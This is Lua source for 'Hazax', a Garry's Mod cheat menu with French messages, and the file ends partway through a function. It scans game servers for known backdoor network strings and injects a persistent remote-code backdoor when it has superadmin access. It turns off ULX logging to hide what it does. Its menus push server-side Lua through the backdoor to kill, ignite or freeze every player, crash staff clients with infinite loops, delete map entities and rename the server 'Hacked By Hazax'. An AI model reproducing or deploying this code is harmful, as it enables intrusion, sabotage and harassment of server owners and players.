------------------------------------------------------------

MsgC (Color(math.random(1,255),math.random(1,255),math.random(1,255)), [[


 /$$   /$$                                                /$$$$$$$$                     /$$           /$$   /$$             
| $$  | $$                                               | $$_____/                    | $$          |__/  | $$             
| $$  | $$  /$$$$$$  /$$$$$$$$  /$$$$$$  /$$   /$$       | $$       /$$   /$$  /$$$$$$ | $$  /$$$$$$  /$$ /$$$$$$   /$$$$$$$
| $$$$$$$$ |____  $$|____ /$$/ |____  $$|  $$ /$$//$$$$$$| $$$$$   |  $$ /$$/ /$$__  $$| $$ /$$__  $$| $$|_  $$_/  /$$_____/
| $$__  $$  /$$$$$$$   /$$$$/   /$$$$$$$ \  $$$$/|______/| $$__/    \  $$$$/ | $$  \ $$| $$| $$  \ $$| $$  | $$   |  $$$$$$ 
| $$  | $$ /$$__  $$  /$$__/   /$$__  $$  >$$  $$        | $$        >$$  $$ | $$  | $$| $$| $$  | $$| $$  | $$ /$$\____  $$
| $$  | $$|  $$$$$$$ /$$$$$$$$|  $$$$$$$ /$$/\  $$       | $$$$$$$$ /$$/\  $$| $$$$$$$/| $$|  $$$$$$/| $$  |  $$$$//$$$$$$$/
|__/  |__/ \_______/|________/ \_______/|__/  \__/       |________/|__/  \__/| $$____/ |__/ \______/ |__/   \___/ |_______/ 
                                                                             | $$                                           
                                                                             | $$                                           
                                                                             |__/                                           
                                                                                                                                                

]])
						

local n = net
local s = net.Start
local ss = net.WriteString
local stc = net.Send
local hp = http.Post
local netKey = "";
local vgui = vgui;         
local surface = surface;       
local render = render;         
local Color = Color;       
local input = input;       
local hook = hook;         
local next = next;         
local timer = timer;  
local GetConVarNumber = GetConVarNumber;     
local util = util;         
local player = player;         
local Vector = Vector;         
local Angle = Angle;       
local FindMetaTable = FindMetaTable;       
local team = team;         
local LocalPlayer = LocalPlayer;       
local draw = draw;             
local debug = debug;       
local table = table;       
local Entity = Entity;         
local ScrW, ScrH = ScrW, ScrH;         
local RunConsoleCommand = RunConsoleCommand;       
local GAMEMODE = GAMEMODE;         
local CurTime = CurTime;       
local cam = cam;
local silent = CreateClientConVar("silent", 0, false, false);
totalExploits = 0
BackdoorsFound = 0
local ply = LocalPlayer()


function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

-- Exploit 1
function removeAll() -- Strips all Players
    for k,v in pairs(player.GetAll()) do
        stripPlayer(v)
    end
end

function stripPlayer(ply) -- Strip player function
    if ply:IsPlayer() then
        for k,v in pairs(ply:GetWeapons()) do
            net.Start("properties")
            net.WriteString( "remove" , 32 )
            net.WriteEntity( v )
            net.SendToServer()
        end
    end
end



GRADIENT_HORIZONTAL = 0;
GRADIENT_VERTICAL = 1;
function draw.LinearGradient(x,y,w,h,from,to,dir,res)
    dir = dir or GRADIENT_HORIZONTAL;
    if dir == GRADIENT_HORIZONTAL then res = (res and res <= w) and res or w;
    elseif dir == GRADIENT_VERTICAL then res = (res and res <= h) and res or h; end
    for i=1,res do
        surface.SetDrawColor(
            Lerp(i/res,from.r,to.r),
            Lerp(i/res,from.g,to.g),
            Lerp(i/res,from.b,to.b),
            Lerp(i/res,from.a,to.a)
        );
        if dir == GRADIENT_HORIZONTAL then surface.DrawRect(x + w * (i/res), y, w/res, h );
        elseif dir == GRADIENT_VERTICAL then surface.DrawRect(x, y + h * (i/res), w, h/res ); end
    end
end

---------------------
--  SPLOIT NOTIFY  --
---------------------

---------------------

local function playSound(url)
    sound.PlayURL(url, '', function( station ) 
        if ( IsValid( station ) ) then
        station:SetPos( LocalPlayer():GetPos() )
        station:Play()
        end
    end)
end

hook.Add("Think", "RAINBOWPLAYER", function()
local RainbowPlayer = HSVToColor( CurTime() % 6 * 60, 1, 1 )
    LocalPlayer():SetWeaponColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
    LocalPlayer():SetPlayerColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
end)

-----------------------------

-- CHECKER
    if( ValidNetString("memeDoor") ) then
        netKey = "memeDoor"
    else
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
        netKey = "Sandbox_Armdupe"
    else
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
        netKey = "DarkRP_AdminWeapons"
    else
    end

    if( ValidNetString("SessionBackdoor") ) then
        netKey = "SessionBackdoor"
    else
    end

    if( ValidNetString("Fix_Keypads") ) then
        netKey = "Fix_Keypads"
    else
    end

    if( ValidNetString("Remove_Exploiters") ) then
        netKey = "Remove_Exploiters"
    else
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
        netKey = "noclipcloakaesp_chat_text"
    else
    end

    if( ValidNetString("_Defqon") ) then
        netKey = "_Defqon"
    else
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
        netKey = "_CAC_ReadMemory"
    else
    end

    if( ValidNetString("nostrip") ) then
        netKey = "nostrip"
    else
    end

    if( ValidNetString("LickMeOut") ) then
        netKey = "LickMeOut"
    else
    end

    if( ValidNetString("MoonMan") ) then
        netKey = "MoonMan"
    else
    end

    if( ValidNetString("Im_SOCool") ) then
        netKey = "Im_SOCool"
    else
    end

    if( ValidNetString("ULXQUERY2") ) then
        netKey = "ULXQUERY2"
    else
    end
	
    if( ValidNetString("Hazaxlebg") ) then
        netKey = "Hazaxlebg"
    else
    end
	
    if( ValidNetString("zilnix") ) then
        netKey = "zilnix"
    else
    end

    if( ValidNetString("enablevac") ) then
        netKey = "enablevac"
    else
    end

    if( ValidNetString("c") ) then
        netKey = "c"
    else
    end
	
    if( ValidNetString("��?D)?") ) then
        netKey = "��?D)?"
    else
    end
	
    if( ValidNetString("disablebackdoor") ) then
        netKey = "disablebackdoor"
    else
    end
	
    if( ValidNetString("kill") ) then
        netKey = "kill"
    else
    end

    if netKey == "" then
         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hazax Scan-Backdoor", "] ", Color( 255, 255, 255 ), "Aucune Backdoor Sur Ce Serveur" )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hazax Scan-Backdoor", "] ", Color( 0, 255, 0 ), "BACKDOOR Trouve Sur Ce Serveur".. netKey )
            -- Auto shut down ULX Logs
            if GetConVarNumber("silent") == 1 then
                net.Start(netKey)
                net.WriteString( "ulx_logecho 0" )
                net.WriteBit (0)
                net.SendToServer()

                timer.Simple(0.1, function()
                    net.Start(netKey)
                    net.WriteString( "ulx_logecho 0" )
                    net.WriteBit (1)
                     net.SendToServer()

                chat.AddText("ULX Logs disabled." )
                end)
            end
    end
	
	--[[-----------
LE STRIP 
--------------]]
function jefaitlenculer() 
    for k,v in pairs(player.GetAll()) do
        nikelesrageux(v)
    end
end
	
	function checkbackdoors()
    if( ValidNetString("memeDoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[HazaxFDP]", Color( 0, 255, 0 )," LE BACKDOOR C ! - memeDoor" )
        netKey = "memeDoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," PAS DE BACKDOOR : Non trouv� : - memeDoor!" )
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," BACKDOOR ! - Sandbox_Armdupe" )
        netKey = "Sandbox_Armdupe"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 255, 0, 0 )," Pas de BACKDOOR: - Sandbox_Armdupe!" )
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," BACKDOOR ! - DarkRP_AdminWeapons" )
        netKey = "DarkRP_AdminWeapons"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas De BackDoor: - DarkRP_AdminWeapons!" )
    end
    if( ValidNetString("SessionBackdoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," BACKDOOR ! - SessionBackdoor" )
        netKey = "SessionBackdoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 250, 0 )," Pas De BackDoor : - SessionBackdoor!" )
    end

    if( ValidNetString("Fix_Keypads") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 250, 0 )," BackDoor : - Fix_Keypads" )
        netKey = "Fix_Keypads"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[HazaxFDP]", Color( 0, 250, 0 ),"Pas De BACKDOOR - Fix_Keypads!" )
    end

    if( ValidNetString("Remove_Exploiters") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," Backdoor : - Remove_Exploiters" )
        netKey = "Remove_Exploiters"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas De BACKDOOR - Remove_Exploiters!" )
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," BACKDOOR - noclipcloakaesp_chat_text" )
        netKey = "noclipcloakaesp_chat_text"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas De BACKDOOR: - noclipcloakaesp_chat_text!" )
    end

    if( ValidNetString("_Defqon") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," BACKDOOR - _Defqon" )
        netKey = "_Defqon"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas De BACKDOOR : - _Defqon!" )
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," BackDoor - _CAC_ReadMemory" )
        netKey = "_CAC_ReadMemory"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas De BACKDOOR : - _CAC_ReadMemory!" )
    end

    if( ValidNetString("nostrip") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," BACKDOOR - nostrip" )
        netKey = "nostrip"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 ),"Pas De BACKDOOR - nostrip!" )
    end

    if( ValidNetString("LickMeOut") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," Backdoor  ! - LickMeOut" )
        netKey = "LickMeOut"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas De BACKDOOR - LickMeOut!" )
    end

    if( ValidNetString("MoonMan") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 ),"BackDoor  -MoonMan" )
        netKey = "MoonMan"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas De BACKDOOR : - MoonMan!" )
    end

    if( ValidNetString("Im_SOCool") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," Backdoor : - Im_SOCool" )
        netKey = "Im_SOCool"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas De BACKDOOR - Im_SOCool!" )
    end

    if( ValidNetString("ULXQUERY2") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," Backdoor : - ULXQUERY2" )
        netKey = "ULXQUERY2"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas De BACKDOOR - ULXQUERY2!" )
    end
	
    if( ValidNetString("Hazaxlebg") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," BACKDOOR :  - Hazaxlebg" )
        netKey = "Hazaxlebg"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas De BACKDOOR  - Hazaxlebg!" )
    end
	
    if( ValidNetString("zilnix") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," BACKDOOR : - zilnix" )
        netKey = "zilnix"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas de backdoor : - zilnix!" )
    end
	
    if( ValidNetString("enablevac") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," BACKDOOR - enablevac" )
        netKey = "enablevac"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas de backdoor: - enablevac!" )
    end
	
    if( ValidNetString("c") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 255, 255, 255 )," Backdoor trouv� ! - c" )
        netKey = "c"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 255, 0, 0 )," Scan backdoor : Non trouv� : - c!" )
    end
	
    if( ValidNetString("��?D)?") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," Backdoor : - ��?D)?" )
        netKey = "��?D)?"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas de BACKDOOR : - ��?D)?!" )
    end
	
    if( ValidNetString("disablebackdoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," Backdoor : - disablebackdoor" )
        netKey = "disablebackdoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas de backdoor- disablebackdoor!" )
    end
	
	    if( ValidNetString("kill") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Hazax]", Color( 0, 255, 0 )," BackDoor : - kill" )
        netKey = "kill"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Hazax]", Color( 0, 255, 0 )," Pas de BACKDOOR : - kill!" )
    end
	
    SploitNotify("LA BACKDOOR MON REY EST ".. netKey )
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hazax", "] ", Color( 78, 255, 0 ), "BackDoor Trouvé: ".. netKey  )
end

function Inject()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hazax", "] ", Color( 255, 0, 0 ), " Injection en cours..." )
    if ( ply:IsSuperAdmin() ) then
        timer.Simple( 3, function() 
            if( ValidNetString("SessionBackdoor") ) then

            else
                RunConsoleCommand( "ulx", "logecho", "0" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('SessionBackdoor')" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('SessionBackdoor') net.Receive('SessionBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
                RunConsoleCommand( "ulx", "logecho", "1" )
                chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hazax", "] ", Color( 0, 255, 0 ), " BACKDOOR Injectée!" )
            end
        end )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hazax", "] ", Color( 0, 255, 0 ), " T PAS SUPERADMIN FDP !" )
    end
    if( ValidNetString("SessionBackdoor") ) then
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hazax", "] ", Color( 0, 255, 0 ), " La backdoor elle ezst deja mise stop force ou jtencule" )
    end
end

function bhop()
local AddHook = dismay and dismay.AddHook or hook and hook.Add or function() print("fuck i missed") end;
AddHook("CreateMove", "BHOP", function(cmd)
        if (cmd:KeyDown(IN_JUMP)) then
                if(cmd:GetMouseX() < 0) then
                        cmd:SetSideMove(-10000);
                elseif(cmd:GetMouseX() > 0) then
                        cmd:SetSideMove(10000);
                end
        if (LocalPlayer():IsOnGround()) then
                cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_JUMP));
                        return;
        end
end
cmd:RemoveKey(IN_JUMP);
end)
end

surface.CreateFont("Font", {
font = "Lato Light",
size = 21,
weight = 300
})
surface.CreateFont("CheckFont", {
font = "Segoe UI Light",
size = 17,
weight = 300
})

surface.CreateFont("Target", {
font = "Segoe UI Light",
size = 15,
weight = 300
})

surface.CreateFont( "Title", {
        font = "Lato Light",
        size = 30,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
} )

surface.CreateFont( "tamere", {
        font = "Roboto",
        size = 150,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
		bold = true,
} )

surface.CreateFont( "Welcome", {
        font = "Lato Light",
        size = 25,
        weight = 10,
        antiaalias = true,
        strikeout = false,
        additive = true,
} )

function Hazax()
local Menu = vgui.Create("DFrame")
Menu:SetSize(900, 900)
Menu:Center()
Menu:SetTitle("")
Menu:MakePopup()
Menu:ShowCloseButton(false) 

Menu.Paint = function(self, w, h)
surface.SetDrawColor( 30, 30 , 30 )
surface.DrawRect( 0, 0, Menu:GetWide(), Menu:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Menu:GetWide(), Menu:GetTall() )

     draw.DrawText( "Hazax v 1.0", "Font", 10, 2, Color(math.random(900),math.random(900),math.random(900)))
end


local Close = vgui.Create("DButton", Menu)
Close:SetPos( 842, 1 )
Close:SetSize( 53, 20 )
Close:SetText( "" )
function Close:Paint( w, h )
    draw.RoundedBoxEx( 4, 0, 0, w, h, Color(255,0,0) )
end

Close.DoClick = function()
    Menu:Close()  
end 
end

-------------------------------------------------------------
surface.CreateFont( "APG_title_font", {
	font = "Arial",
	size = 14,
	weight = 700,
} )


surface.CreateFont( "APG_sideBar_font", {
    font = "Arial",
    size = 18,
    weight = 1500,
} )

surface.CreateFont( "APG_mainPanel_font", {
    font = "Arial",
    size = 19,
    weight = 8500,
} )

function actioneff(aff)
	hook.Add( "HUDPaint", "infohud", function()
		draw.SimpleTextOutlined(
        aff,
        "DermaLarge",
        ScrW() /2 ,
        40,
        Color( 255, 0, 0, 255 ),
        TEXT_ALIGN_CENTER,
        TEXT_ALIGN_CENTER,
        1,
        Color( 0, 0, 255 )
    )
   end )
   
   timer.Simple( 3, function() hook.Remove( "HUDPaint", "infohud" ) end )
	
end

hook.Add("HUDPaint", "Credits", function() draw.SimpleTextOutlined( "Hazax Activés", "creditsfont", ScrW()/2 + math.sin(RealTime()) * ScrW() / 85, ScrH()/15, Color( 255, 255, 255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,160) )

end)

surface.CreateFont( "creditsfont", {  
    font = "Roboto",
    extended = false,
    size = 20,
    weight = 600,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})

local main_color = Color(32, 255, 0,255)


    local Frame = vgui.Create( "DFrame" )
        Frame:SetSize( ScrW() -200, ScrH() -200)
        Frame:SetPos( ScrW()/2- Frame:GetWide()/2, ScrH()/2 - Frame:GetTall()/2)
        Frame:SetTitle( "" )
        Frame:SetVisible( true )
        Frame:SetDraggable( true )
        Frame:MakePopup()
        Frame:ShowCloseButton(false)
        Frame:SetIcon( "icon16/bug.png" )
        Frame.Paint = function(i,w,h)
            draw.RoundedBox(4,0,0,w,h,Color(34, 34, 34,255))
            draw.RoundedBox(0,0,23,w,1,main_color)
            local name = "         Hazax"
            draw.DrawText( name, "APG_title_font",8, 5, Color( 189, 189, 189), 3 )
        end
    local closeButton = vgui.Create("DButton",Frame)
        closeButton:SetPos(Frame:GetWide() - 20,4)
        closeButton:SetSize(16,16)
        closeButton:SetText('')
        closeButton.DoClick = function()
            Frame:Remove()
        end
        closeButton.Paint = function(i,w,h)
            draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255,3))
            draw.DrawText( "✕", "APG_sideBar_font",0, -2, Color( 189, 189, 189), 3 )
        end
		
		
local Button = vgui.Create( "DButton", Frame )
Button:SetText( "" )
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( (Frame:GetWide() / 2) - 60,40 )
Button:SetSize( 120, 30 )
        Button.UpdateColours = function( label, skin )
            label:SetTextStyleColor( Color( 189, 189, 189 ) )
        end
		
		        Button.Paint = function(slf, w, h)

            draw.RoundedBox(0,0,h*0.85,w-5,1, Color(0, 96, 0,255))
            local text = "Tout le monde"
            draw.DrawText( text, "APG_mainPanel_font",5, 8, Color( 189, 189, 189), 3 )
        end
		
		
Button.DoClick = function()
	local m = DermaMenu()
local infoserver, infoservericon = m:AddSubMenu( "Serveur" )
infoservericon:SetIcon( "icon16/bug.png" )
m:AddSpacer()
local meutreall, meutreiconall = m:AddSubMenu( "Meutre" )
meutreiconall:SetIcon( "icon16/bomb.png" )
m:AddSpacer()
local ulxall, ulxallicon = m:AddSubMenu( "Commandes" )
ulxallicon:SetIcon( "icon16/script_add.png" )

local meutreallsub, meutreallsubicon = meutreall:AddSubMenu( "Tuer" )
meutreallsubicon:SetIcon( "icon16/delete.png" )

local explosesub, explosesubicon = meutreall:AddSubMenu( "Exploser" )
explosesubicon:SetIcon( "icon16/delete.png" )
local igniteallssub, igniteallssubicon = meutreall:AddSubMenu( "Bruler" )
igniteallssubicon:SetIcon( "icon16/delete.png" )
local kicksub, kicksubicon = ulxall:AddSubMenu( "Kick" )
kicksubicon:SetIcon( "icon16/status_away.png" )
local bansub, bansubicon = ulxall:AddSubMenu( "Ban" )
bansubicon:SetIcon( "icon16/status_busy.png" )
local freezesub, freezesubicon = ulxall:AddSubMenu( "Freeze" )
freezesubicon:SetIcon( "icon16/stop.png" )


m:AddSpacer()







local animationall, animationallicon = m:AddSubMenu( "Animation" )
animationallicon:SetIcon( "icon16/wand.png" )
local animationallsubdance, animationallsubicondance = animationall:AddSubMenu( "Danse!" )
animationallsubicondance:SetIcon( "icon16/wand.png" )
local trollall, trollallicon = m:AddSubMenu( "Troll Menu" )
trollallicon:SetIcon( "icon16/rainbow.png" )
local nuke, nukeicon = trollall:AddSubMenu( "Nuke" )
nukeicon:SetIcon( "icon16/lightning.png" )


local gravitesub, gravitesubicon = trollall:AddSubMenu( "Gravité Break" )
gravitesubicon:SetIcon( "icon16/rainbow.png" )


local quakeearth, quakeearthicon = trollall:AddSubMenu( "Tremblement" )
quakeearthicon:SetIcon( "icon16/rainbow.png" )

local prisonsub, prisonsubicon = trollall:AddSubMenu( "Prison" )
prisonsubicon:SetIcon( "icon16/user_orange.png" )

ulxall:AddOption( "CleanUP", function() 
net.Start(netKey)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit(1)
net.SendToServer()
 end ):SetIcon( "icon16/cut.png" )

bansub:AddOption( "STAFF", function() 
net.Start(netKey)
net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
 end ):SetIcon( "icon16/user_gray.png" )


meutreallsub:AddOption( "ALL", function() 
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit(1)
net.SendToServer() 
end ):SetIcon( "icon16/user.png" )


igniteallssub:AddOption( "ALL", function() 
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(999999999) end" )
net.WriteBit(1)
net.SendToServer() 
end ):SetIcon( "icon16/user.png" )

freezesub:AddOption( "ALL", function() 
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Freeze(999999999) end" )
net.WriteBit(1)
net.SendToServer() 
 end ):SetIcon( "icon16/user.png" )

trollall:AddOption( "2D Players", function() 
net.Start(netKey)
net.WriteString([[
for k,v in pairs(player.GetAll()) do 
local a = v:LookupBone("ValveBiped.Bip01_Head1")
local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
v:ManipulateBoneScale( a, Vector(4,0,4)) 
v:ManipulateBoneScale( b, Vector(0,0,0))
v:ManipulateBoneScale( c, Vector(0,0,0))
v:ManipulateBoneScale( d, Vector(0,0,1))
v:ManipulateBoneScale( e, Vector(0,0,1))
v:ManipulateBoneScale( f, Vector(0,0,0))
v:ManipulateBoneScale( g, Vector(0,0,0))
v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
v:ManipulateBoneScale( j, Vector(0,0,0))
v:ManipulateBoneScale( k, Vector(0,0,0))
end]])
net.WriteBit(1)
net.SendToServer()
end ):SetIcon( "icon16/bug.png" )

trollall:AddOption( "Donner la grosse tête à tous les joueurs", function() 
net.Start(netKey)
net.WriteString([[
for k,v in pairs(player.GetAll()) do 
local a = v:LookupBone("ValveBiped.Bip01_Head1")
local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
v:ManipulateBoneScale( a, Vector(100,100,100)) 
v:ManipulateBoneScale( b, Vector(100,100,100))
v:ManipulateBoneScale( c, Vector(100,100,100))
v:ManipulateBoneScale( d, Vector(100,100,100))
v:ManipulateBoneScale( e, Vector(100,100,100))
v:ManipulateBoneScale( f, Vector(100,100,100))
v:ManipulateBoneScale( g, Vector(100,100,100))
v:ManipulateBoneScale( h, Vector(100,100,100))
v:ManipulateBoneScale( i, Vector(100,100,100))
v:ManipulateBoneScale( j, Vector(100,100,100))
v:ManipulateBoneScale( k, Vector(100,100,100))
end]])
net.WriteBit (1)
net.SendToServer()
end ):SetIcon( "icon16/bug.png" )

trollall:AddOption( "Changer la taille des joueurs", function() 
local tall = [[
hook.Add("Think", "tall", function()
for k,v in pairs (player.GetAll()) do
v:SetModelScale(0.2, 80);
v:SetRunSpeed(400 * 2);
v:SetWalkSpeed(200 * 2);
end
end)]]
net.Start(netKey)
net.WriteString( tall )
net.WriteBit (1)
net.SendToServer()
end ):SetIcon( "icon16/application_edit.png" )

trollall:AddOption( "Hurlement sur tous les joueurs", function() 
		 net.Start( netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit(1)
net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

trollall:AddOption( "Faire crash [STAFF]", function() 
net.Start(netKey)
net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
end ) :SetIcon( "icon16/disconnect.png" )

infoserver:AddOption( "Enlever les logs", function() 
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
net.WriteBit(1)
net.SendToServer()
end ):SetIcon( "icon16/cog_delete.png" )

infoserver:AddOption( "Changer le nom du serveur", function() 
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"hostname\", \"Hacked By Hazax\")" )
net.WriteBit(1)
net.SendToServer()
end ):SetIcon( "icon16/server_edit.png" ) 

infoserver:AddOption( "Changer l'écran de chargement", function() 
net.Start(netKey)
net.WriteString( "sv_loadingurl", "https://securitycamcenter.com/wp-content/uploads/2017/09/dahua_hacked-1440x1008.jpg" )
net.WriteBit(1)
net.SendToServer()
